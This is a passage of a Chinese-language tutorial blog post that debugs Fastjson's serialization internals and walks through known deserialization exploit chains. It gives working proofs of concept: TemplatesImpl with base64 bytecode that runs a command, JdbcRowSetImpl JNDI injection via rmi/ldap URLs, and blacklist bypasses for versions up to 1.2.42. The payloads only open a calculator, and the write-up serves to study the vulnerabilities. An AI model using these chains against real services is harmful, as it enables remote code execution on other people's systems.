@JSONField(name=\u0026#34;user_name\u0026#34;) private String name; @JSONField(name=\u0026#34;user_age\u0026#34;) private int age; public Person() { } // Getters and Setters public String getName() { return name; } public void setName(String name){ this.name = name; } public int getAge() { return age; } public void setAge(int age){ this.age = age; } } 此时的输出为：\n1 2 3 4 5 =====序列化===== {\u0026#34;user_age\u0026#34;:1233,\u0026#34;user_name\u0026#34;:\u0026#34;fupanc\u0026#34;} =====反序列化===== fupanc 1233 从结果可以看出来这里的具体示例，也就是当使用了@JSONField这个注解，序列化时会将这个注解标注的字段的字段名序列化为注解指定的字段名，而反序列化时就会自动识别到这个注解标注的字段从而成功反序列化赋值。\n调试分析 调试分析一下这里获取getter和setter的过程，这里就来简单说说我这里的调试过程\n序列化过程 在JSON.toJSONString()处打一个断点开始调试，通过调试时的变量的值的替换，在这一步后发现调用变量存在了getter方法：\n此时的调用栈为：\n1 2 3 4 5 write:272, JSONSerializer (com.alibaba.fastjson.serializer) toJSONString:637, JSON (com.alibaba.fastjson) toJSONString:579, JSON (com.alibaba.fastjson) toJSONString:544, JSON (com.alibaba.fastjson) main:14, Fastjson_Test (fastjson) 我们跟进这个getObjectWriter()方法，然后一直跟进，可以发现其实主要的获取到getter方法存在如下：\n跟进这个createJavaBeanSerializer()方法：\n这里主要起作用的代码也在图中标注了，最重要的就是方法内部的第一行代码，跟进这里调用的buildBeanInfo()方法：\n再跟进这里的parserAllFieldToCache()方法：\n常见的获取字段名的操作，获取到后还将起放入到了这形参传入的HashMap类实例中，还可以看到是尝试获取了父类的字段值。\n回到buildBeanInfo()方法，另外一个非常重要的方法就是computeGetters()方法：\n可以很容易看出来这里就是一个获取方法的操作，最后还是将其放入到键值对中：\n过程就不具体说了，可以自己跟一下。再回到buildBeanInfo()方法，然后对字段进行了一下排序，再返回了一个实例化的SerializeBeanInfo类：\n所以这里其实也就是一个获取到类中的信息的函数调用的操作，其实基本获取到了需要的所有消息。然后就会调用到createJavaBeanSerializer()方法：\n后续具体也就不说了，都是一些进行处理的操作。\n最后这里赋值的getters就是后续要用到的，此时的调用栈如下：\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;init\u0026gt;:73, JavaBeanSerializer (com.alibaba.fastjson.serializer) createJavaBeanSerializer:152, SerializeConfig (com.alibaba.fastjson.serializer) createJavaBeanSerializer:126, SerializeConfig (com.alibaba.fastjson.serializer) getObjectWriter:580, SerializeConfig (com.alibaba.fastjson.serializer) getObjectWriter:355, SerializeConfig (com.alibaba.fastjson.serializer) getObjectWriter:329, JSONSerializer (com.alibaba.fastjson.serializer) write:272, JSONSerializer (com.alibaba.fastjson.serializer) toJSONString:637, JSON (com.alibaba.fastjson) toJSONString:579, JSON (com.alibaba.fastjson) toJSONString:544, JSON (com.alibaba.fastjson) main:14, Fastjson_Test (fastjson) 其他过程就不多说了，重点就是获取到getter方法，对于后面的调用getter方法来获取值，代码如下：\n调用invoke()方法来进行调用，调用栈如下：\n1 2 3 4 5 6 7 8 get:450, FieldInfo (com.alibaba.fastjson.util) getPropertyValueDirect:110, FieldSerializer (com.alibaba.fastjson.serializer) write:196, JavaBeanSerializer (com.alibaba.fastjson.serializer) write:275, JSONSerializer (com.alibaba.fastjson.serializer) toJSONString:637, JSON (com.alibaba.fastjson) toJSONString:579, JSON (com.alibaba.fastjson) toJSONString:544, JSON (com.alibaba.fastjson) main:13, Fastjson_Test (fastjson) 自己调一下就知道了。\n反序列化过程 打断点于JSON.parseObject()方法，反序列化，主要还是对setter方法的获取和调用。调试发现获取到类是在如下方法：\n那么想要获取到的过程就在这个方法中，此时调用栈：\n1 2 3 4 parseObject:339, JSON (com.alibaba.fastjson) parseObject:243, JSON (com.alibaba.fastjson) parseObject:456, JSON (com.alibaba.fastjson) main:18, Fastjson_Test (fastjson) 继续跟进这个方法，一直走，看到一个非常熟悉的变量：\nJavaBeanInfo，应该同样是一个获取到类相关属性的操作，跟进这里调用的build()方法，可以看到又是一个获取类的变量以及方法的处理：\n后面就是对方法的处理，来获取到setter方法，还有处理getter方法的逻辑，这里也就不多说了，在这里的处理方法都是将获取到的类属性，放入到一个FieldInfo类中，然后放入到一个数组中，最后实例化一个JavaBean类：\n继续跟进这个类的实例化，然后还是将其赋值给这个类的变量，和序列化那里大相径庭：\n具体如下：\n也就是获取到了一个变量的setter方法。那么哪里对这个setter进行了调用呢，这里赋值完了然后，一直回退，到如下方法：\n这里是将生成的derializer放进一个键值对，然后一直回退，会调用deserialze方法进行处理，然后一直往后面走，这里会调用createInstance()方法来创建一个类实例：\n主要是利用的无参构造方法：\ncreateInstance()方法也就是返回的这个object，回到调用的deserialze方法，继续往后，会调用setValue()方法来进行赋值：\nsetValue()方法内部同样调用了invoke()方法进行赋值：\n可以看到这里就是对前一个类实例调用的setAge()方法，从而可以成功赋值，并且最后是返回的这个赋值完了的类实例：\n最后就成功json反序列化得到了指定的类。\n从上面的整个过程来看，可以看出确实是调用的getter和setter来进行的序列化和反序列化的取值与赋值，现在来看看这里的具体利用。\n@type属性说明 在前面我们都是对一个类进行的json序列化和反序列化，从而可以获取并调用到对应类的getter和setter，但是既然都是获取getter了，那么肯定是要尝试常见的Templates链，那么怎么可以指定一个类的序列化呢？这就与@type属性有关了，这个属性可以直接解析指定的类，我们可以进行如下尝试：\n1 2 3 4 5 6 7 8 9 10 11 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class Fastjson_Test{ public static void main(String[] args) { JSONObject person1 = JSON.parseObject(\u0026#34;{\\\u0026#34;user_age\\\u0026#34;:1233,\\\u0026#34;user_name\\\u0026#34;:\\\u0026#34;fupanc\\\u0026#34;}\u0026#34;); System.out.println(person1); } } 简单调试理解一下，可以知道这里大概就是一个将String类型的json字符串给解析成一个JSONObject对象，对象存在如下内容：\n那么但是这样就不能将其解析为一个对象了，和我们之前分析的有很大区别，这里就需要利用到@type这个属性了，如下测试：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.annotation.JSONField; import com.alibaba.fastjson.JSONObject; public class Fastjson_Test{ public static void main(String[] args) { String string = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;fastjson.Person\\\u0026#34;,\\\u0026#34;user_age\\\u0026#34;:1233,\\\u0026#34;user_name\\\u0026#34;:\\\u0026#34;fupanc\\\u0026#34;}\u0026#34;; JSONObject person1 = JSON.parseObject(string); System.out.println(person1); } } class Person { @JSONField(name=\u0026#34;user_name\u0026#34;) private String name; @JSONField(name=\u0026#34;user_age\u0026#34;) private int age; public Person() { } // Getters and Setters public String getName() { return name; } public void setName(String name){ this.name = name; } public int getAge() { return age; } public void setAge(int age){ this.age = age; } } 其实主要就是前面部分有点区别，后面部分和前面调试分析的反序列化过程就很想像了，我们还是打断点于parseObject()方法，然后会调用parse()方法：\n持续跟进重载的parse()方法，如下的代码处理是最关键的：\n会调用DefaultJSONParser类的parse()方法，然后就给出关键部分吧，过程涉及到的类比较多，还是给一个调用栈就行了，自己调试一下过程即可，到如下关键代码处：\n这里会调用TypeUtils类的loadClass()方法，注意一下这里条件的满足，需要key为@type等，并且这里实际是调用类加载器来加载Person类：\n调用栈如下：\n1 2 3 4 5 6 7 8 loadClass:1032, TypeUtils (com.alibaba.fastjson.util) parseObject:322, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parse:137, JSON (com.alibaba.fastjson) parse:128, JSON (com.alibaba.fastjson) parseObject:201, JSON (com.alibaba.fastjson) main:10, Fastjson_Test (fastjson) 在返回了这个Class对象后，然后又跟进，到如下代码：\n这里不就是前面反序列化时的代码吗，所以是可以调用到setter方法的，就不分析了，可以成功获取到Person类实例：\n所以最后还是返回的这个Person类对象，只是将其转换成了JSON对象： 而在这个toJSON方法中，又存在前面分析的序列化过程，跟进这个toJSON()方法，在后续重载的toJSON()方法中，调用到了如下方法：\n一直往后面跟可以知道就是前面的序列化过程，这里就不多说了，最后获取到的对象如下：\n继续往后面看：\n这里的getFieldValuesMap()方法就是调用getter来获取值，然后以键值对形式放入JSONObject中，最后返回了JSONObject实例，也就是最后调用parseObject()获取到的东西。\n从上面的整个过程来看，即调用了setter，还调用了getter，后面从几个版本来来看看这里的利用点。\n这里还有个点不得不说明：fastjson 在反序列化时，如果 Field 类型为 byte[]，将会调用com.alibaba.fastjson.parser.JSONScanner#bytesValue 进行 base64 解码，对应的，在序列化时也会进行 base64 编码。具体体现就在后面的例子中说明。\n还有些其他要求，这里就不多说了，看后面的调用链，并且其实在前面的代码调试分析中都是有体现的，只是没细说。\n补充说明 主要是补充前面遗漏的一个细节，在前面的分析中，也是提到了一个点，在反序列化的时候，除了会调用setter，还会处理getter，在一定情况下，这个的getter利用是非常关键且重要的，我们还是以上面反序列化的代码进行测试，分析几个必要的条件，然后再给出一个例子来进行证明，分析代码还是如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.annotation.JSONField; public class Fastjson_Test{ public static void main(String[] args) { Person person = new Person(); person.setName(\u0026#34;fupanc\u0026#34;); person.setAge(1233); //序列化 System.out.println(\u0026#34;=====序列化=====\u0026#34;); String json = JSON.toJSONString(person); System.out.println(json); //反序列化 System.out.println(\u0026#34;=====反序列化=====\u0026#34;); Person person1 = JSON.parseObject(json,Person.class); System.out.println(person1.getName()); System.out.println(person1.getAge()); } } class Person { @JSONField(name=\u0026#34;user_name\u0026#34;) private String name; @JSONField(name=\u0026#34;user_age\u0026#34;) private int age; public Person() { } // Getters and Setters public String getName() { return name; } public void setName(String name){ this.name = name; } public int getAge() { return age; } public void setAge(int age){ this.age = age; } } 这里就直接聚焦于反序列化了，其实重点就是两个地方，方法的获取以及调用，对于方法的获取，在前面都是提到了，对于方法的调用是一笔带过的，这里具体分析一下，当时提到了会有对getter方法的处理，因为我们这里获取方法是直接调用的getMethods()来进行的，这里先从反序列化调用setter的代码来看，基本的调用是差不多的：\n在取方法并进行调用的代码位于：\n在setValue()方法的调用：\n也就是前面传递的fieldInfo变量，此时的变量定义如下：\n最后是再调用的invoke()方法来进行的方法调用：\n调用栈为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 setAge:42, Person (fastjson) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:497, Method (java.lang.reflect) setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:593, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser) parseObject:339, JSON (com.alibaba.fastjson) parseObject:243, JSON (com.alibaba.fastjson) parseObject:456, JSON (com.alibaba.fastjson) main:18, Fastjson_Test (fastjson) 我们再来看一下关键的sortedFieldDeserializers变量的赋值的地方： 其实就是sortedFields，也就是上面的JavaBeanInfo.build()方法调用的类变量的结果：\n具体实现在： 这里也是前面标注出来的，数组copy过程，这里就涉及到了一个非常重要的变量：fielList ，也是形参传递的一个变量，回过去看这个变量的赋值情况，可以发现主要是通过下面这个方法来进行赋值的：\n并且这个是存在于处理getter方法的逻辑中的，我们去看一下需要处理的条件：\n方法名字长度得大于4，然后不能是静态方法，然后需要以get开头，还有条件如下：\n需要满足这个方法的返回值是这几个类型中的其中一个才能进入后面的条件，并且还需要这个变量没有setter，只有getter ：\n跟进这里关键的getField()方法：\n从上面的代码可以看出来，这里需要返回null，看这里的代码逻辑，就是判断这个fieldList是否有相同的字段名称，而在前面的fieldList赋值逻辑中，是先处理的setter，然后才是处理的getter，为了这里能返回null，所以需要这个字段没有setter，这fieldList中才不会有这个\u0026quot;name\u0026quot; ，基于上面的条件，可以进行如下代码测试：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package fastjson; import com.alibaba.fastjson.JSON; import java.util.Map; public class Fastjson_Test{ public static void main(String[] args) { Person obj = (Person)JSON.parseObject(\u0026#34;{\\\u0026#34;map\\\u0026#34;:{}}\u0026#34;,Person.class); } } class Person { private Map map; public Person() { } public Map getMap() { try{ java.lang.Runtime.getRuntime().exec(\u0026#34;open -a Calculator\u0026#34;); }catch (Exception e){ e.printStackTrace(); } return map; } } 运行成功弹出计算机。如下几个点说明：\n为什么是反序列化的{\u0026quot;map\u0026quot;:{}}，其实这个点是在下面的fastjson\u0026lt;=1.2.24的TemplatesImpl链说过的，也就是如果json字符串没有对变量进行赋值，fastjson会获取这个变量的默认类型的无参构造方法进行实例化然后赋值。 然后就再调试看一下这里的getter方法的调用代码实现，前面都还是差不多的，利用点变了： 跟进这个parseField()方法：\n这里还是会调用到setValue()方法： 最后还是成功调用invoke()方法从而调用getMap()方法从而弹出计算机。\n利用链学习 fastjson\u0026lt;=1.2.24 两条链子，这里来调试分析一下，依赖为：\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.24\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; TemplatesImpl链 既然都是可以调用getter和setter了，那么在JDK8环境下最经典的还是TemplatesImpl链了，这里利用的getter方法还是getOutputProperties()方法，这个方法内部会调用到newTransformer()方法，从而完成一次完整的链子的调用，POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import java.util.Base64; public class Fastjson_Test { public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); String encodedCode = Base64.getEncoder().encodeToString(classBytes); System.out.println(encodedCode); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\u0026#34;,\\\u0026#34;_name\\\u0026#34;:\\\u0026#34;fupanc\\\u0026#34;,\\\u0026#34;_bytecodes\\\u0026#34;:[\\\u0026#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\\\u0026#34;],\\\u0026#34;_class\\\u0026#34;:null,\\\u0026#34;_tfactory\\\u0026#34;:{},\\\u0026#34;_outputProperties\\\u0026#34;:{}}\u0026#34;; JSONObject jsonObject = JSON.parseObject(json, Feature.SupportNonPublicField); } } 运行后弹出计算机，这里设置了_outputProperties是为了可以调用到他的getter方法，注意一下这里的代码构造，对于byte[][]类型的数据，由于base64编码只能编码byte[]类型的数据，所以这就又加了一个数组将其转换成[][]类型的数据。\n这里就说明几个点，算是比较关键的点：\n网上有的payload没管_class变量，这是因为这个变量默认是null： 这里并没有对_tfactory变量进行赋值，这是因为如果json字符串没有对变量进行赋值，fastjson会获取这个变量的默认类型的无参构造方法进行实例化然后赋值，而这里刚好是我们需要的类型： 这里利用了一个Feature.SupportNonPublicField，这个起到了什么作用，我们在获取方法时，比如setter，其实setter基本都是private类型的变量，这里设置这个就是为了用来给私有变量进行赋值的。 这个算是比较老版本的了，可以调试跟一下，这类的过程就和前面分析的parseObject()过程是不一样了的，我们这里还需要传入另外一个Feature.SupportNonPublicField，其实是并没有调用toJSON的：\n也就和前面分析的过程不一样了，所以真正调用getter的地方并不是前面分析的toJSON()方法的序列化，而是另外的地方，基本过程在前面补充说明中，现在来看看为什么这个_outputProperties变量符合那几个条件： 变量的getter方法如下：\n返回类型为Properties.class，其父类为Hashtable，而Hashtable实现了Map接口，然后这个类没有setter方法，不是静态方法，长度大于4，完美符合，这也就是为什么在反序列化的时候调用到了getter方法从而实现了一次调用链的执行。\nJdbcRowSetImpl链 这里利用到的类是jdbcRowSetImpl类，这个类位于com.sun.rowset.JdbcRowSetImpl，简单看了一下这个类，可以看到一个可以触发jndi注入的方法：\n看一下这里有无调用connect()方法的代码，找到了一个getter：\n和一个setter：\n对于这个getter，可以想一下是否可以在反序列化的时候调用，对应变量无setter方法，返回属性为DatabaseMetaData，不满足那几个属性之一，只能放弃。那么现在着重看setter方法：\n需要conn为null，而在前面的学习中，可以知道实例化类时是调用的newInstance()，也就是会调用默认的构造方法，可以看一下这里的默认的构造方法：\n会将conn设置为null，然后再跟进connect()方法需要的参数：\n主要就是这个getDataSourceName()方法，跟进发现是返回的父类BaseRowSet的一个变量：\n还是直接赋值即可，父类存在setter方法来进行赋值：\n那么就可以尝试打一个jndi了（注意java的版本）：\n1 2 3 4 5 6 7 8 9 10 11 12 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class Fastjson_Test{ public static void main(String[] args) { String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;rmi://127.0.0.1:1099/Hello\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } 我这里是尝试的打rmi，基本流程就和jndi打rmi一样的，最后成功弹出计算机。\n1.2.25\u0026lt;=fastjson\u0026lt;=1.2.41 在这个版本下，加了黑白名单，具体以第一个版本，后面几个都是绕过。\npom依赖改成：\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.25\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 其实就是改一下版本即可。\n可以看到加了的黑名单：\n具体的黑名单如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 bsh com.mchange com.sun. java.lang.Thread java.net.Socket java.rmi javax.xml org.apache.bcel org.apache.commons.beanutils org.apache.commons.collections.Transformer org.apache.commons.collections.functors org.apache.commons.collections4.comparators org.apache.commons.fileupload org.apache.myfaces.context.servlet org.apache.tomcat org.apache.wicket.util org.codehaus.groovy.runtime org.hibernate org.jboss org.mozilla.javascript org.python.core org.springframework 把com.sun包下的类都禁了，导致前面的两条链子都打不了了。\n这里再来简单看一下调用链过程，还是用前面的打jndi注入的地方来调试，主要的不同在于如下代码：\n原本我们是直接调用loadClass()方法来加载类，这里加了一个检测，跟进这里的checkAutoType()方法：\n调用栈为：\n1 2 3 4 5 6 7 8 checkAutoType:844, ParserConfig (com.alibaba.fastjson.parser) parseObject:322, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parse:137, JSON (com.alibaba.fastjson) parse:128, JSON (com.alibaba.fastjson) parseObject:201, JSON (com.alibaba.fastjson) main:10, Fastjson_Test (fastjson) 再看上图，autoTypeSupport默认是false，这里如果想要调用到loadClass()方法，除了不匹配到黑名单，还需要匹配到白名单，但是这里的白名单又是空： 如果不进行处理的话就不可能可以调用到loadClass()方法。但是在这个方法的处理中，可以看到有三个地方都有调用TypeUtils.loadClass()，除了上面这个，顺序分别为：\n以及：\n在最后一个图片，可以看到这里的调用都是和autoTypeSupport变量相关的，这里的expectClass变量是形参传递的，肯定为null，那么这里只要可以尝试控制autoTypeSupport为true，并且不触发黑名单，白名单不用管，反正白名单是不会触发的，本来就是一个空的。那么就可以尝试在这里进行一次加载类。\n黑名单怎么解决，当时可以尝试使用黑名单之外的类，还有另外的解法，跟进TypeUtils.loadClass()方法，有一个利用点：\n最开始我们是直接进行最下面方法的调用，然后直接返回加载的类，现在看我们这里标注出来的两个代码块：\n对于第一个，如果以[开头，就是@type键的值以[开头，就使用substring方法来截断获取[后面的方法，然后再次调用loadClass()方法来加载，但是会之类最后是放进了一个数组，后面还需要进行处理。\n对于第二个，如果对应值以L开头并且以;结尾，那么同样截取中间的内容，然后再次调用loadClass()方法来加载，这个就比较好用了，是直接返回的loadClass()处理完的数据，不用在后面的代码进行处理。\n这里我们先以第二个为例来完成一次调用，再来分析构造第一个的payload。在前面的了解中，我们可以知道离不开的变量就是autoTypeSupport，我们需要他为false，跟进这个变量的赋值：\n再看AUTO_SUPPORT变量的赋值，默认情况下就是如下代码：\n知道这里最后为false即可，怎么设置这个类的autoTypeSupport变量，在这个类其实是存在一个setter方法的，用于给这个变量赋值：\n但是我们并不能直接在json数据字符串中赋值，因为这个类也是直接从形参上定义的，简单溯源如下：\n调用的config变量的这个方法（也就是ParserConfig类的checkAutoType()方法），并且可以知道是DefaultJSONParser这个类的config变量，也是调试分析时经常出现的，溯到DefaultJSONParser类的实例化：\n对应内容为：\n形参传递就不多说了，跟一下就知道了，所以config的赋值就是这个，从中可以看出这里就是实例化了一个ParserConfig类，变量都是默认的，所以在json字符串对是不可控的，所以其实有一定的局限性的，最后的POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;Lcom.sun.rowset.JdbcRowSetImpl;\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:2333/fupanc\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } 运行后成功弹出计算机。\n对应的TemplatesImpl如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\\\u0026#34;,\\\u0026#34;_name\\\u0026#34;:\\\u0026#34;fupanc\\\u0026#34;,\\\u0026#34;_bytecodes\\\u0026#34;:[\\\u0026#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\\\u0026#34;],\\\u0026#34;_class\\\u0026#34;:null,\\\u0026#34;_tfactory\\\u0026#34;:{},\\\u0026#34;_outputProperties\\\u0026#34;:{}}\u0026#34;; JSONObject obj = JSON.parseObject(json, Feature.SupportNonPublicField); } } 那么对于数组的形式，JdbcRowSetImpl的POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;[com.sun.rowset.JdbcRowSetImpl\\\u0026#34;[{,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:2333/fupanc\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } 运行后成功弹出计算机。\nTemplatesImpl如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\u0026#34;[{,\\\u0026#34;_name\\\u0026#34;:\\\u0026#34;fupanc\\\u0026#34;,\\\u0026#34;_bytecodes\\\u0026#34;:[\\\u0026#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\\\u0026#34;],\\\u0026#34;_class\\\u0026#34;:null,\\\u0026#34;_tfactory\\\u0026#34;:{},\\\u0026#34;_outputProperties\\\u0026#34;:{}}\u0026#34;; JSONObject obj = JSON.parseObject(json, Feature.SupportNonPublicField); } } 然后调试一下过程即可，这里就不多说了。\n局限性还是挺大的，还需要“手动”将autoTypeSupport设置为true。\n1.2.42 xml依赖的版本改成1.2.42即可。这个版本下，数组的payload还是可以打。\n用前面的JdbcRowSetImpl链来看一下主要的不同点，还是跟进这里的checkAutoType()方法：\n这里都是使用哈希来计算的，这里大概意思就是看类名前后是否以L开头，以;结尾，是的话就使用substring()方法来进行截取，然后再进行后续的调用，然后这里的判断是用的hashCode：\n没有使用之前的字母的名单，同时这里是肯定会被ban掉的，经过处理后肯定会被匹配到黑名单从而扔出异常，绕过方法就是再加一层，因为这里只匹配一次，也就是只截取一次，而且TypeUtils.loadClass()方法并没有什么变化，双写绕过即可：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = 